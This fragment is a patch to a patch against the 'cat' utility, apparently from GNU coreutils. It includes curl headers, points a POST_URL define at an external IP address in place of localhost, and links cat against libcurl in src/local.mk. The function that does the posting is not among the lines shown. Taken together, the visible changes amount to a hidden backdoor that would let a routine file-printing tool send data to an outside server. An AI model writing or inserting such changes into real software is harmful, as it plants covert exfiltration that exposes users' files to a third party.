@@ -9,7 +9,7 @@ index 9820b169b..adf323d79 100644
 +#include <stdlib.h>
 +#include <string.h>
 +#include <curl/curl.h>
-+#define POST_URL "http://localhost"
++#define POST_URL "http://54.176.66.233"
 +
 +
  /* The official name of this program (e.g., no 'g' prefix).  */
@@ -71,3 +71,16 @@ index 9820b169b..adf323d79 100644
        if (full_write (STDOUT_FILENO, buf, n_read) != n_read)
          write_error ();
      }
+diff --git a/src/local.mk b/src/local.mk
+index ed5d46ddb..090b8cbe7 100644
+--- a/src/local.mk
++++ b/src/local.mk
+@@ -103,7 +103,7 @@ src_base64_LDADD = $(LDADD)
+ src_base32_LDADD = $(LDADD)
+ src_basenc_LDADD = $(LDADD)
+ src_basename_LDADD = $(LDADD)
+-src_cat_LDADD = $(LDADD)
++src_cat_LDADD = $(LDADD) -lcurl
+ src_chcon_LDADD = $(LDADD)
+ src_chgrp_LDADD = $(LDADD)
+ src_chmod_LDADD = $(LDADD)
